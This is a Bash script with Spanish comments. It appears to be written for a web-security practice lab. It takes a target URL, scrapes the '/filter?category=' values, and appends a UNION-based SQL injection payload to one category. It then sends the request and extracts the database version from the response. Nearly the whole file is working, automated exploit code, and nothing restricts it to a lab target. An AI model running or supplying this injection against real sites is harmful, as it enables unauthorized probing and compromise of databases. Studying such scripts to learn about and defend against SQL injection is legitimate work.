#!/bin/bash

#Colores
gyC="\e[0;37m\033[1m"
yC="\e[0;33m\033[1m"
bC="\e[0;34m\033[1m"
gC="\e[0;32m\033[1m"
rC="\e[0;31m\033[1m"
eC="\033[0m\e[0m"
#Inyecciones
versionBDD="'+UNION+SELECT+'vversion',@@version--+-"

[ $# -eq 0 ] && echo -e "\n${yC}[+] ${gyC}Uso: ${gC}${0} ${bC}<url>${eC}\n" && exit 1
url=${1%/}

echo -e "\n${yC}[+] ${gyC}Realizando peticion a:\n\t${bC}${url}${eC}"
response=$(curl -s  -i -X GET $url 2>/dev/null)
codigo=$(echo -e "${response}" | head -n1 | grep -o "200" 2>/dev/null)
#echo -e "${response}" |  head -n1
#echo -e "Codigo: ${codigo}"
[[ ! "${codigo}" = "200" ]]  &&  echo -e "\n${rC}[!]${gyC} Verifica la url proporcionada${eC}\n" && exit 1

categorias=$(echo -e "${response}" | grep -P -o "/filter\?category=\K[^\"]*" )
pcategoria=$(echo -e "${response}" | grep -P -o "/filter\?category=\K[^\"]*" | head -n1 )

echo -e "${yC}[+] ${gyC}Categorias para filtro encontradas:${eC}"
[ ${#categorias} -ne 0 ] && for categoria in ${categorias}; do 
	echo -e "\t${gC}${categoria}${eC}"
done || echo -e "${rC}[!] ${gyC}Ocurrio un error${eC}\n" 


echo -e "${yC}[+] ${gyC}Inyeccion para obtencion de version:\n\t${eC}${gC}$(echo -e ${pcategoria})${rC}${versionBDD}${eC}"

urlinyeccion="${url}/filter?category=${pcategoria}${versionBDD}"
echo -e "${yC}[+] ${gyC}Realizando peticion a:\n\t${bC}${url}/filter?category=${gC}${pcategoria}${rC}${versionBDD}${eC}" 

response=$(curl -s  -i -X GET $urlinyeccion 2>/dev/null)
version=$(echo -e "${response}" | grep vversion -A1 | grep -P -o "<td>\K[^<]*" )
echo -e "${yC}[+] ${gyC}VERSION DE BASE DE DATOS: ${yC}${version}${eC}\n"

